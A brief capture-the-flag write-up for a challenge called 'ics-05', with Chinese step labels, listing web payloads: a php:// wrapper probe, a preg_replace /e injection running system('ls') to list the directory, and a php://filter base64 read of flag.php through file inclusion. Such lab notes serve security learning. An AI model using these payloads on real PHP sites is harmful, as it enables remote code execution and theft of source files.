
# ics-05

* php伪协议
>  ?page=php:

* 扫描当前目录
> ?pat=/test/e&rep=system('ls')&sub=test

* 利用前面的文件包含获取 flag.php
> ?page=php://filter/read=convert.base64-encode/resource=s3chahahaDir/flag/flag.php

